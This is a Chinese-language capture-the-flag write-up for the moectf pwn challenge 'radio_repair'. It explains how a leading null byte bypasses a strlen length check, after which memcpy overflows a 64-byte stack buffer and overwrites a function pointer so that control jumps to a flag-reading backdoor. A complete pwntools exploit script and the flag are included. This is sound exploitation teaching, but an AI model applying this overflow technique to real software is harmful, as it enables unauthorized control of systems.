# Pwn Writeup: radio_repair (电台故障)

## Flag
`moectf{radio_repair_cipher_truncation}`

## 一、 题目基本信息
- **题目类型**：Pwn / 栈溢出 / 逻辑漏洞
- **保护机制（checksec）**：
  - Arch: amd64-64-little
  - RELRO: Partial RELRO
  - Stack: No canary found
  - NX: NX enabled (栈不可执行)
  - PIE: No PIE (基址固定为 0x400000)

## 二、 漏洞分析

**漏洞类型：**
1. **字符串截断绕过（Null Byte Truncation）**：程序使用 `strlen(n0x48_1) <= 0x20` 作为安全校验。但 C 语言的 `strlen` 在遇到 `\x00`（空字节）时会直接停止读取并返回当前长度。如果在输入开头填入 `\x00`，就能让 `strlen` 返回 0，完美绕过长度检查。
2. **栈缓冲区溢出（Stack Buffer Overflow）**：校验通过后，程序调用 `memcpy(v7, n0x48_1, p_n0x48)`。`v7` 数组只有 64 字节，但 `p_n0x48` 允许输入最大 72 字节（`0x48`）。多出的 8 个字节会直接溢出，覆盖紧挨在 `v7` 后面的函数指针。
3. **函数指针劫持（Function Pointer Hijacking）**：被覆盖的函数指针 `p_show_status` 在 `memcpy` 执行完毕后会被立即调用，从而劫持程序控制流，跳转到后门函数 `repair_complete` 拿 Flag。

**核心代码：**
```c
unsigned __int8 p_n0x48; // [rbp-A1h] 长度变量
_QWORD n0x48_1[9];       // [rbp-A0h] 缓冲区
char v6;                 // [rbp-58h]
_QWORD v7[8];            // [rbp-50h] 复制目标缓冲区 (64字节)
void (*p_show_status)(void); // [rbp-10h] 函数指针

read_exact(&p_n0x48, 1);
if ( p_n0x48 && p_n0x48 <= 0x48u ) {
    read_exact(n0x48_1, p_n0x48);
    if ( (unsigned __int64)j_strlen_ifunc(n0x48_1) <= 0x20 ) {
        j_memcpy(v7, n0x48_1, p_n0x48); 
        p_show_status();
    }
}
```

## 三、 利用思路
程序内存在一个后门函数 `repair_complete()`，其内部逻辑为直接 `open("/flag")` 并 `write` 出来。地址为 `0x40182A`。

**攻击流程**：
1. 发送长度字节 `\x48`。
2. 构造 Payload：第一个字节放 `\x00` 骗过 `strlen` 检查，后面跟着 63 个垃圾字符，最后 8 字节填入 `repair_complete` 的地址。
3. 程序执行 `memcpy` 时，会将 Payload 复制到栈上，并将 `p_show_status` 覆盖为后门地址。
4. 执行 `p_show_status()` 时，成功跳转后门读取 Flag。

## 四、 完整 EXP 脚本

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# p = process('./pwn')
p = remote("靶机IP", 端口)

# 后门函数 repair_complete 的地址
repair_complete_addr = 0x40182A

# 接收提示
p.recvuntil(b"Enter repair ciphertext:")

# 1. 发送长度 0x48 (72字节)
p.send(b'\x48')

# 2. 构造 Payload
# \x00 用于绕过 strlen 截断
# 填充到偏移 64 的位置
# p64(地址) 覆盖函数指针
payload  = b'\x00' + b'A' * 63
payload += p64(repair_complete_addr)

# 发送 Payload
p.send(payload)

# 接收输出的 Flag
data = p.recvall(timeout=3)
print(data.decode(errors='ignore'))
```

## 五、 踩坑与总结
1. **C语言字符串特性**：`strlen` 遇 `\x00` 停止计算，`memcpy` 却按指定长度全量复制。这种**检查与使用不一致（TOCTOU / 截断漏洞）**是 Pwn 中极其经典的绕过手法。
2. **函数指针的利用**：相比于覆盖返回地址，直接覆盖程序内部定义的函数指针往往更简单直接，不需要计算复杂的栈对齐或 ROP 链。
3. **偏移计算**：`memcpy` 从 `v7` 开始复制，由于 `v7` 是 64 字节，紧随其后的 `p_show_status` 刚好在偏移 64 处，所以填满 64 字节后直接填目标地址即可。